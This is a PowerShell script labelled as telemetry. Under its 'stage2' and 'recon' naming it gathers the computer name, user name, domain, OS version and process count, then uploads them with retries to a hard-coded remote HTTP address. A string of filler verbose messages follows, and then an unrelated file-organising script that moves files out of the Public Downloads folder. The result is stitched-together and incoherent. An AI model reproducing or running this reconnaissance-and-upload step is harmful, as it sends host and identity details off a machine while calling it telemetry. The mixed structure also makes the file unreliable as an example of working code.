
<#
.SYNOPSIS
    Telemetry collection and HTTP upload workflow.

.DESCRIPTION
    Builds a compact host profile from environment variables and
    operating-system metadata, writes it as JSON and uploads it
    with a bounded retry loop.

.NOTES
    Only host metadata is included.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://192.0.2.144/upload',
    [string]$ReportPath = "$env:TEMP\recon.json",
    [string]$LogPath = "$env:TEMP\transfer.log",
    [int]$TimeoutSec = 104
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Profile
function Get-SystemProfile {
    $Profile = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    return $Profile
}

# Uploader
function Send-StageReport {
    [CmdletBinding()]
    param(
        [string]$EndpointUrl = '',
        [string]$BodyPath = "",
        [int]$RetryCount = 3
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $Body = Get-Content -Path $BodyPath -Raw
            return Invoke-RestMethod -Uri $EndpointUrl -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 104
        }
        catch {
            Write-Verbose ("Upload attempt " + $Attempt + " failed")
            Start-Sleep -Seconds 3
        }
    }
    return $null
}

try {
    Write-StageLog -Message "Starting telemetry upload"
    $FetchResult = Get-SystemProfile
    $FetchResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    $UploadResult = Send-StageReport -EndpointUrl $RemoteUrl -BodyPath $ReportPath -RetryCount 3
    Write-StageLog -Message ("Upload result: " + $UploadResult)
}
catch {
    Write-Warning "Telemetry workflow failed: $($_.Exception.Message)"
}

$TelemetryReport = [ordered]@{
    Stage = "upload"
    Endpoint = $RemoteUrl
    ReportPath = $ReportPath
    TimeoutSec = $TimeoutSec
}
$TelemetryReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Exporting operation report"
Write-Verbose "Stage handoff finished"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Operation completed"
Write-Verbose "Applying operation timeout"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$SourcePath = 'C:\Users\Public\Downloads'
$DestinationRoot = 'E:\SortedFiles'
$LogPath = "C:\Logs\organise-2025-10-05.log"
$DryRun = $false
$map = @{
    '.pdf'  = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.zip'  = 'Archives'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    Move-Item -LiteralPath $file.FullName -Destination $folder -WhatIf:$DryRun
}
Write-Host ("Processed {0} files" -f @($files).Count) -ForegroundColor Cyan
